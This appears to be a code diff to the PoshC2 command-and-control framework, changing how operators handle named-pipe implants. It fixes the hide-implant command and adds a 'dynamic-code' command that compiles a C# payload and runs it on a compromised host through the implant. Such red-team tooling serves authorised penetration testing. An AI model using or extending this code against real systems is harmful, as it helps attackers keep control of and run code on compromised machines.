@@ -1,4 +1,4 @@
-import base64, re, traceback, os, string, sys
+import base64, re, traceback, os, string, sys, subprocess
 from prompt_toolkit import PromptSession
 from prompt_toolkit.history import FileHistory
 from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
@@ -14,7 +14,7 @@ from poshc2.server.Config import PBindPipeName, PBindSecret
 from poshc2.server.Core import print_bad
 from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter
 from poshc2.server.PowerStatus import getpowerstatus
-from poshc2.server.database.DB import new_task, unhide_implant, kill_implant, get_implantdetails, get_sharpurls, get_baseenckey
+from poshc2.server.database.DB import hide_implant, new_task, unhide_implant, kill_implant, get_implantdetails, get_sharpurls, get_baseenckey
 from poshc2.server.database.DB import select_item, new_c2_message, get_powerstatusbyrandomuri, update_label, get_randomuri
 
 
@@ -97,7 +97,7 @@ def handle_pbind_command(command, user, randomuri, implant_id):
         unhide_implant(oldrandomuri)
 
     elif command.startswith("hide-implant"):
-        kill_implant(oldrandomuri)
+        hide_implant(oldrandomuri)
 
     elif command.startswith("inject-shellcode"):
         params = re.compile("inject-shellcode", re.IGNORECASE)
@@ -125,6 +125,7 @@ def handle_pbind_command(command, user, randomuri, implant_id):
 
     elif command == "kill-implant" or command == "exit":
         impid = get_implantdetails(randomuri)
+        print_bad("**OPSEC Warning** - kill-implant terminates the current threat not the entire process, if you want to kill the process use kill-process")
         ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid.ImplantID)
         if ri.lower() == "n":
             print("Implant not terminated")
@@ -251,7 +252,11 @@ def handle_pbind_command(command, user, randomuri, implant_id):
         print(sharp_help)
 
     elif command.startswith("pbind-connect"):
+        new_task("pbind-loadmodule PBind.exe", user, randomuri)      
         do_pbind_start(user, command, randomuri)
+
+    elif command.startswith("dynamic-code"):
+        do_dynamic_code(user, command, randomuri)
 
     elif command.startswith("beacon") or command.startswith("set-beacon") or command.startswith("setbeacon"):
         new_sleep = command.replace('set-beacon ', '')
@@ -268,6 +273,17 @@ def handle_pbind_command(command, user, randomuri, implant_id):
         if command:
             new_task(f"pbind-command {original_command}", user, randomuri)
         return
+
+
+def do_dynamic_code(user, command, randomuri):
+    compile_command = "mono-csc %sDynamicCode.cs -out:%sDynamicCode.exe -target:exe -warn:2 -sdk:4.5" % (PayloadsDirectory, PayloadsDirectory)
+    try:
+        subprocess.check_output(compile_command, shell=True)
+    except subprocess.CalledProcessError:
+        return
+    command = command.replace("dynamic-code", "").strip()
+    check_module_loaded(f"{PayloadsDirectory}DynamicCode.exe", randomuri, user, force=True, loadmodule_command="pbind-loadmodule")
+    new_task(f"pbind-command run-exe DynamicCode.Program DynamicCode {command}", user, randomuri)
 
 
 def do_pbind_start(user, command, randomuri):
